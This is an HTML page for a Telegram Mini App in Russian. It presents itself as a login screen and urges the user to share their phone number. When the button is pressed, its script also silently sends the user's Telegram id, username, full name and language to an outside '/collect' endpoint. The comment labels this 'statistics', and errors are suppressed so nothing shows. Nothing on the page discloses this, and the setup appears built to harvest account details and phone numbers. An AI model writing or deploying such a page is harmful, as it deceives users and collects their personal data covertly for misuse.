<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mini App</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: var(--tg-theme-bg-color, #fff);
      color: var(--tg-theme-text-color, #000);
      font-family: -apple-system, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }
    .container {
      text-align: center;
      width: 100%;
      max-width: 400px;
    }
    button {
      background: var(--tg-theme-button-color, #2481cc);
      color: var(--tg-theme-button-text-color, #fff);
      border: none;
      border-radius: 12px;
      padding: 16px 48px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      margin-top: 16px;
      transition: 0.3s;
    }
    button:active { opacity: 0.8; }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    .status {
      margin-top: 20px;
      padding: 12px;
      border-radius: 8px;
      font-size: 14px;
      display: none;
    }
    .status.show { display: block; }
    .status.success { background: #d4edda; color: #155724; }
    .status.error { background: #f8d7da; color: #721c24; }
    .loader {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid var(--tg-theme-button-color, #2481cc);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-right: 10px;
      vertical-align: middle;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .hint { font-size: 12px; color: #888; margin-top: 8px; }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔐 Вход</h2>
    <p style="color: #888; margin: 12px 0;">Нажмите кнопку для отправки номера</p>
    
    <button id="btn">📱 Отправить номер</button>
    
    <div id="status" class="status"></div>
    <div class="hint">После нажатия нажмите "Отправить номер" в Telegram</div>
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const btn = document.getElementById('btn');
    const statusDiv = document.getElementById('status');

    btn.addEventListener('click', async () => {
      btn.disabled = true;
      btn.innerHTML = '<span class="loader"></span> Отправка...';
      statusDiv.className = 'status show';
      statusDiv.textContent = '⏳ Открываю окно отправки номера...';

      try {
        // ОТПРАВЛЯЕМ ЗАПРОС НА ОТПРАВКУ НОМЕРА ЧЕРЕЗ TELEGRAM
        tg.sendData(JSON.stringify({ 
          action: 'request_contact',
          user_id: tg.initDataUnsafe?.user?.id || 'unknown'
        }));
        
        // ОТПРАВЛЯЕМ ДАННЫЕ НА СЕРВЕР (для статистики)
        const user = tg.initDataUnsafe?.user || {};
        const payload = {
          user_id: user.id || 'unknown',
          username: user.username || '',
          name: `${user.first_name || ''} ${user.last_name || ''}`.trim(),
          language: user.language_code || navigator.language,
          time: new Date().toISOString(),
          action: 'webapp_opened'
        };

        // Отправляем данные в фоне
        fetch('https://logi-production-033f.up.railway.app/collect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(() => {});

        statusDiv.className = 'status show success';
        statusDiv.textContent = '✅ Запрос отправлен! Нажмите "Отправить номер" в Telegram.';
        
        // Закрываем через 3 секунды
        setTimeout(() => {
          tg.close();
        }, 3000);

      } catch (error) {
        statusDiv.className = 'status show error';
        statusDiv.textContent = '❌ Ошибка: ' + error.message;
        btn.disabled = false;
        btn.innerHTML = '📱 Отправить номер';
      }
    });
  </script>
</body>
</html>
